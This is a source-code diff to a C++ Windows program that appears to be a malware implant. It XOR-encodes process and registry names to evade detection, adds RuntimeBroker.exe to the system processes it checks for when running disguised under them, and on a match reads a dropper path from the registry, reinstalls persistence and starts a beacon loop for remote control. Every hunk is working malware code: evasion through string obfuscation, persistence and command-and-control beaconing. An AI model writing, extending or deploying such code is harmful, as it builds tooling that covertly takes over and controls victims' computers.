@@ -18,11 +18,11 @@
 
 namespace {
     // XOR Encrypted Strings (Key 0x5A)
-    const wchar_t kExplorerEnc[] = { 0x3F, 0x22, 0x2A, 0x36, 0x35, 0x28, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F }; // explorer.exe
-    const wchar_t kSvchostEnc[] = { 0x29, 0x2C, 0x39, 0x32, 0x35, 0x28, 0x2E, 0x74, 0x3F, 0x22, 0x3F }; // svchost.exe
-    const wchar_t kVolatileEnvEnc[] = { 0x0C, 0x35, 0x36, 0x3B, 0x2E, 0x33, 0x36, 0x3F, 0x7A, 0x1F, 0x34, 0x2C, 0x33, 0x28, 0x35, 0x34, 0x37, 0x3F, 0x34, 0x2E }; // Volatile Environment
-    const wchar_t kDropperPathEnc[] = { 0x1E, 0x28, 0x35, 0x2A, 0x2A, 0x3F, 0x28, 0x0A, 0x3B, 0x2E, 0x32 }; // DropperPath
-    const wchar_t kRuntimeBrokerEnc[] = { 0x08, 0x2F, 0x34, 0x2E, 0x33, 0x37, 0x3F, 0x18, 0x28, 0x35, 0x31, 0x3F, 0x28, 0x74, 0x3F, 0x22, 0x3F }; // RuntimeBroker.exe
+    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
+    const wchar_t kSvchostEnc[] = { 's'^0x5A, 'v'^0x5A, 'c'^0x5A, 'h'^0x5A, 'o'^0x5A, 's'^0x5A, 't'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // svchost.exe
+    const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A }; // Volatile Environment
+    const wchar_t kDropperPathEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A }; // DropperPath
+    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x5A, 'u'^0x5A, 'n'^0x5A, 't'^0x5A, 'i'^0x5A, 'm'^0x5A, 'e'^0x5A, 'B'^0x5A, 'r'^0x5A, 'o'^0x5A, 'k'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // RuntimeBroker.exe
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
@@ -41,6 +41,8 @@ namespace {
     bool IsSystemProcess(const std::wstring& sPath) {
         if (sPath.find(utils::DecryptW(kExplorerEnc, 12)) != std::wstring::npos) return true;
         if (sPath.find(utils::DecryptW(kSvchostEnc, 11)) != std::wstring::npos) return true;
+        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
+        if (sPath.find(rb) != std::wstring::npos) return true;
         return false;
     }
 
@@ -83,6 +85,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     if (IsSystemProcess(currentPath)) {
         LOG_INFO("ROLE: Foothold.");
+        LOG_INFO("Path matched system process. Initiating persistence and beaconing...");
         wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
         std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
@@ -99,6 +102,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             // If IPC fails, we still try to reinstall from whatever we can find
             persistence::ReinstallPersistence();
         }
+        LOG_INFO("Starting beacon loop...");
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
